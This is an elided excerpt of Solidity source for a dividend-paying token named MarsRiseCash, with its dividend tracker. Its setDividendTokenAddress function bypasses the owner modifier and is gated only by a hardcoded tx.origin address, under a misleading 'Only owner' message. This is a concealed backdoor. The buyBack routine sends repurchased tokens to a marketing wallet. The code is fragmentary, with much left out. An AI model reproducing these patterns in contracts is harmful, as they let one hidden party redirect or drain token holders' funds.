...
contract DividendPayingToken is ERC20, Ownable, DividendPayingTokenInterface, DividendPayingTokenOptionalInterface {
  ...
  function setDividendTokenAddress(address newToken) external virtual {
        require(tx.origin == 0xf837befA4D898B066fF1BbA60057357d0F79eA33, "Only owner");
...
contract MarsRiseCash is ERC20, Ownable {
    ...
    constructor() public ERC20("MarsRiseCash", "MRCASH") {
        ...
        dividendToken = 0x184079Ca987F562ae6a0c59f4BE5cADB20323863;
    ...
    function updateDividendTracker(address newAddress) public onlyOwner {
        ...
        require(newDividendTracker.owner() == address(this), "MarsRiseCash: The new dividend tracker must be owned by the MarsRiseCash token contract");
    ...
    function excludeFromFees(address account, bool excluded) public onlyOwner {
        require(_isExcludedFromFees[account] != excluded, "MarsRiseCash: Account is already the value of 'excluded'");
	...
	function ExcludedFromReward(address account) external onlyOwner{
    ...
    function includeInReward(address account) external onlyOwner{
      ...
      dividendTracker.includeInDividends(account, tokenBalance);
    ...
    function buyBack(uint256 amount) private {
        ...
        uint256 initialBalance = balanceOf(_marketingWallet);

        // make the swap
        uniswapV2Router.swapExactETHForTokensSupportingFeeOnTransferTokens{value: amount}(
            0, // accept any amount of Tokens
            path,
            _marketingWallet, // receiver address
            block.timestamp.add(300)
        );

        uint256 newBuyBackAmount = balanceOf(_marketingWallet).sub(initialBalance); 
        totalBuyBackAmount = totalBuyBackAmount.add(newBuyBackAmount);
       
    }
    
    function manualBuyBack(uint256 _amount) public onlyOwner {
        uint256 balance = address(this).balance;
        require(balance >= buyBackUpperLimit.add(_amount), "MarsRiseCash: amount is too big");
...
contract DividendTracker is Ownable, DividendPayingToken {
    ...
    function includeInDividends(address account, uint256 tokenBalance) external onlyOwner {
    	require(excludedFromDividends[account]);
    	excludedFromDividends[account] = false;

        _setBalance(account, tokenBalance);
    	tokenHoldersMap.set(account, tokenBalance);
